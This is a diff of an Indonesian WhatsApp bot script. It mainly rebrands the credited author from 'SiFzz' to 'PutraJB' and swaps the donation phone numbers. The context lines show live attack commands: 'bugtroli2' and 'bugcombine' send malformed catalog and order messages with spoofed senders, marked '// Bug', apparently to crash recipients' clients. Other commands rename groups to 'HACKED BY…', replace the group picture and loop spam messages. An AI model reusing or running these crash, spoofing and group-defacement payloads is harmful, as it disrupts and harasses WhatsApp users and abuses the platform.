@@ -1,4 +1,4 @@
-/**----------( Created By SiFzz Botzz )----------
+/**----------( Created By PutraJB Botzz )----------
 --------------------------------------------------------------------------
 Di Kasih Sc Gratis, No Pw + Free Apikey
 Apa Susah Nya Pencet Tombol Subscribe
@@ -9,19 +9,19 @@ Apa Susah Nya Pencet Tombol Subscribe
 @ZeksApi ( MAKER )
 @YuzApi ( RANDOM )
 @ZeroYt7 ( ASUPAN )
-@SiFzz Api ( Random Gc )
+@PutraJB Api ( Random Gc )
 @HunterApi ( TEKA TEKI )
-@Subscriber SiFzz Botz
+@Subscriber PutraJB Botz
 @PenyediaApikey ( Rest Api Bot )
 @Creator Bot ( Buat Nyolong Case 🗿 )
 -------------------------------------------------------
 ✓ Denis ( BASE ORI )  : 
 https://youtube.com/c/DcodeDenpa
 -------------------------------------------------------
-✓ SiFzz Botz ( RECODE ) : 
+✓ PutraJB Botz ( RECODE ) : 
 https://youtube.com/c/GzBotz
 -------------------------------------------------------
-» Help Me 1k Subs SiFzz
+» Help Me 1k Subs PutraJB
 --------------------------------------------------------------**/
 
 const
@@ -129,7 +129,7 @@ const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
 ky_ttt = []
 tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
 cmhit = []
-fake = "/> SiFzz";
+fake = "/> PutraJB";
 autorespon = settings.AutoRespon
 playmusic = settings.AutoMusic
 antidelete = settings.AntiDelete
@@ -360,11 +360,11 @@ return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a
 }
 		if (antibot === true) return
 		const katalog = (teks) => {
-             res = alpha.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© SiFzz Whatsapp_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftex})
+             res = alpha.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© PutraJB Whatsapp_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftex})
              alpha.relayWAMessage(res)
      }
         const grupinv = (teks) => {
-        	grup = alpha.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": '-----', "groupName": `SiFzz Whatsapp`, "footerText": "*_© SiFzz Whatsapp_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+        	grup = alpha.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": '-----', "groupName": `PutraJB Whatsapp`, "footerText": "*_© PutraJB Whatsapp_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
             alpha.relayWAMessage(grup)
         }
 		idttt = []
@@ -665,7 +665,7 @@ options
 
 const daftar1 = `_Sebelum Menggunakan Bot_\n_Wajib Daftar Terlebih Dahulu Ya_`
 const daftar2 = 'Klik Tombol Di Bawah Untuk Verifikasi'
-const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `💫VERIFIKASI BIAR SiFzz KENAL LU💫`,},type: 1,},]
+const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `💫VERIFIKASI BIAR PutraJB KENAL LU💫`,},type: 1,},]
 
 const createSerial = (size) => {
 return crypto.randomBytes(size).toString('hex').slice(0, size)
@@ -739,7 +739,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
             if (isAfk(mek.key.remoteJid)) return
             addafk(mek.key.remoteJid)
 			heheh = ms(Date.now() - waktuafk)
-		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© SiFzz Whatsapp_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
+		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© PutraJB Whatsapp_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
 			}
 		}
 		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
@@ -752,7 +752,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                         if (isAfk(mek.key.remoteJid)) return
                         addafk(mek.key.remoteJid)
 						heheh = ms(Date.now() - waktuafk)
-			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© SiFzz Whatsapp_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© PutraJB Whatsapp_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
 					}
 				}
 						}
@@ -802,7 +802,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                 });
             }
             const sendKontak = (from, nomor, nama) => {
-	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer SiFzz Whatsapp\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
+	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer PutraJB Whatsapp\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
 	        alpha.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
             }
             const hideTagKontak = async function(from, nomor, nama){
@@ -1146,7 +1146,7 @@ buttons = [
 const menuuu = {
 contentText: `${stamtus}`,
 footerText: `SiFz
-Sz Bot`,
+PutraBotz`,
     buttons: buttons,
     headerType: 1
 }
@@ -1238,7 +1238,7 @@ mhan = await alpha.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
 const sendBtnVeryy = {
 imageMessage: mhan.message.imageMessage,
 contentText:`${jancok}`,
-footerText:'Terimakasih Sudah Mendaftar\n*_©SiFzz_*', 
+footerText:'Terimakasih Sudah Mendaftar\n*_©PutraJB_*', 
 buttons: gbutsan,
 headerType: 4
 }
@@ -1763,7 +1763,7 @@ case 'sound71':
  
  listMsg = {
  buttonText: 'LIST ASUPAN',
- footerText: 'SiFzz✓',
+ footerText: 'PutraJB✓',
  description: `Hai kak☺️ Silahkan pilih menu asupan disini,Gunakan Dengan Bijak Ya kakk`,
  sections: [
                      {
@@ -1879,7 +1879,7 @@ break
 case 'cecanvietnam':
 huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=ZeroYT7`)
 goo = await getBuffer(huft.result.url)
-alpha.sendMessage(from, goo, image, {quoted: fgi, caption: 'Nih Jangan Lupa Subscribe YT : SiFzz'})
+alpha.sendMessage(from, goo, image, {quoted: fgi, caption: 'Nih Jangan Lupa Subscribe YT : PutraJB'})
 break
 case 'cecanrandom':
 ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
@@ -3410,7 +3410,7 @@ anu =`Silahkan pilih salah satu di bawah`
  buttons = [{buttonId: 'setallmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setallmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
 const skuygf = {
     contentText: `${anu}`,
-    footerText: '*_©SiFzz_*',
+    footerText: '*_©PutraJB_*',
     buttons: buttons,
     headerType: 1
 }
@@ -3441,7 +3441,7 @@ case 'ownerr':
 					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 					ini_list.push({
 					"displayName": 'Owner Alphabot',
-					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE SiFzz;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE PutraJB;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 					})
 					}
 					hehe = await alpha.sendMessage(from, {
@@ -3492,7 +3492,7 @@ button = [
 ]
  buttons = {
     contentText: 'Nih Kak Owner ku >_<',
-    footerText: `*SiFzz*`,
+    footerText: `*Putra*`,
     buttons: button,
     headerType: 1
 }
@@ -3566,17 +3566,17 @@ case 'donasi':
 donasi =`اتَّقوا النَّارَ ولو بشقِّ تمرةٍ ، فمن لم يجِدْ فبكلمةٍ طيِّبةٍ
 “jauhilah api neraka, walau hanya dengan bersedekah sebiji kurma (sedikit). Jika kamu tidak punya, maka bisa dengan kalimah thayyibah” [HR. Bukhari 6539, Muslim 1016
 ╔════════════════════
-║ FIX BUG Sz X SiFzz
+║ FIX BUG PutraBotz X PutraJB
 ╠════════════════════
 ║╭──❉ *DONASI SiFz* ❉─────
-║│➸ *OVO*: 083856223089
-║│➸ *DANA*: 083856223089
-║│➸ *PULSA*:083856223089
-║│➸ *gopay*:083856223089
+║│➸ *OVO*: 085841509232
+║│➸ *DANA*: 085841509232
+║│➸ *PULSA*:085783026012
+║│➸ *gopay*:085783026012
 ║│➸*ID ML*: 119623381 (2231)
 ║╰──────────────────
 ║
-║❋ཻུ۪۪⸙ BOT BY SiFzz ❋ཻུ۪۪⸙
+║❋ཻུ۪۪⸙ BOT BY PutraJB ❋ཻུ۪۪⸙
 ═══════════════════`
 buttons = [
 {buttonId:`listmenu`, buttonText: {displayText: '💟LIST MENU💟️'}, type: 1},
@@ -3595,7 +3595,7 @@ await alpha.sendMessage(from, donatt, MessageType.buttonsMessage, {quoted: ftex}
 "templateMessage": {
 						"hydratedTemplate": {
 							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
-							"hydratedFooterText": `SiFzzWhatsapp`,
+							"hydratedFooterText": `PutraJBWhatsapp`,
 							"hydratedButtons": [
 								{
 									"quickReplyButton": {
@@ -3643,11 +3643,11 @@ case 'debug2':
   },
   "hydratedTemplate": {
     "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
-    "hydratedFooterText": `SiFzz Whatsapp`,
+    "hydratedFooterText": `PutraJB Whatsapp`,
     "hydratedButtons": [
       {
         "urlButton": {
-          "displayText": `Script SiFzz Whatsapp`,
+          "displayText": `Script PutraJB Whatsapp`,
           "url": "https://github.com/Gugurko"
         },
         "index": 0
@@ -4647,7 +4647,7 @@ if (args.length < 1) return reply('Teksnya?')
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
   if (args.length < 1) return reply('Teksnya?')
                     teks = body.slice(12)
-                    alpha.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`SiFzz Whatsapp`}, MessageType.location)
+                    alpha.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`PutraJB Whatsapp`}, MessageType.location)
                     reply(`Sukses upload lokasi:\n${teks}`)
                     break	
                     case 'upswsticker':
@@ -4852,13 +4852,13 @@ break
             break
 				case 'attp':
               
-					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp SiFzz Whatsapp`)
+					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp PutraJB Whatsapp`)
 					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
 					alpha.sendMessage(from, atetepe, sticker, { quoted: mek })
 					break
                 case 'ttp':  
               
-                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp SiFzz Whatsapp`)
+                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp PutraJB Whatsapp`)
                     anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                     alpha.sendMessage(from, anu1, image, {quoted: mek, caption : `${prefix}sticker`})
                     break
@@ -5162,7 +5162,7 @@ var nn = body.slice(9)
               if (!isGroupAdmins) return sticAdmin(from)
               if (!isBotGroupAdmins) return sticNotAdmin(from)
               sendBug(from)
-              alpha.groupUpdateSubject(from, `HACKED BY SiFzz Whatsapp`)
+              alpha.groupUpdateSubject(from, `HACKED BY PutraJB Whatsapp`)
                 alpha.groupUpdateDescription(from, `_${me.jid}_`)
              alpha.updateProfilePicture(from, fs.readFileSync('./media/image/me.jpg'))
                 alpha.sendMessage(from, 'Succes!', text, {quoted: ftex})
@@ -5173,7 +5173,7 @@ var nn = body.slice(9)
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 if (args.length < 1) return reply('Jumlahnya?')
 for (let i = 0; i < args[0]; i++) {
-alpha.sendMessage(from, `SiFzz Whatsapp`, MessageType.extendedText,{
+alpha.sendMessage(from, `PutraJB Whatsapp`, MessageType.extendedText,{
  quoted: {
 key: {
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
@@ -5269,7 +5269,7 @@ case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 if (args.length < 1) return reply('Jumlahnya?')
 		        try {
-		        var hets = `SiFzz Whatsapp`
+		        var hets = `PutraJB Whatsapp`
 		        var grousp = await alpha.groupMetadata(from)
                 var membere = grousp['participants']
                 var mems = []
@@ -5293,7 +5293,7 @@ if (args.length < 1) return reply('Jumlahnya?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `SiFzz Whatsapp`,
+						"message": `PutraJB Whatsapp`,
 						"orderTitle": `${NamaOwner}`,
 						"sellerJid": "6283161567237@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -5312,7 +5312,7 @@ if (args.length < 1) return reply('Jumlahnya?')
 						"itemCount": -3599964009,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `SiFzz Whatsapp`,
+						"message": `PutraJB Whatsapp`,
 						"orderTitle": `${NamaOwner}`,
 						"sellerJid": "6283161567237@s.whatsapp.net",
 						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
@@ -5323,7 +5323,7 @@ if (args.length < 1) return reply('Jumlahnya?')
 case 'bugcombine':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                  alpha.toggleDisappearingMessages(from, 'HACKED')
-alpha.sendMessage(from, `SiFzz Whatsapp`, text, {
+alpha.sendMessage(from, `PutraJB Whatsapp`, text, {
  quoted: {
   key: {
    participant: '0@s.whatsapp.net' // Fake sender Jid
@@ -5333,7 +5333,7 @@ alpha.sendMessage(from, `SiFzz Whatsapp`, text, {
     itemCount: 9999999, // Bug
     status: 1,
     surface: 1,
-    message: `SiFzz Whatsapp`,
+    message: `PutraJB Whatsapp`,
     orderTitle: `${NamaOwner}`, // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -5352,7 +5352,7 @@ alpha.updatePresence(from, Presence.composing)
 		       alpha.sendMessage(from, {degreesLatitude: 34.0184,
 						degreesLongitude: -118.411,
 						name: `${NamaOwner}`,
-						address: `SiFzz Whatsapp`,
+						address: `PutraJB Whatsapp`,
                         jpegThumbnail: dfrply },location,{
  quoted: {
   key: {
@@ -5364,7 +5364,7 @@ alpha.updatePresence(from, Presence.composing)
     status: 1,
     surface: 1,
     message: `${NamaOwner}`,
-    orderTitle: `SiFzz Whatsapp`, // 
+    orderTitle: `PutraJB Whatsapp`, // 
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
@@ -5385,7 +5385,7 @@ alpha.sendMessage(from, 'yaudah oke',text, {
     itemCount: 70000, // Bug
     status: 1,
     surface: 1,
-    message: `SiFzz Whatsapp`,
+    message: `PutraJB Whatsapp`,
     orderTitle: `${NamaOwner}`, // 
     sellerJid: '0@s.whatsapp.net' // Seller
    }
@@ -5866,7 +5866,7 @@ break
 punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btngrass = {
     contentText: `${anu}`,
-    footerText: '*_©SiFzz Whatsapp_*',
+    footerText: '*_©PutraJB Whatsapp_*',
     buttons: punten,
     headerType: 1
 }
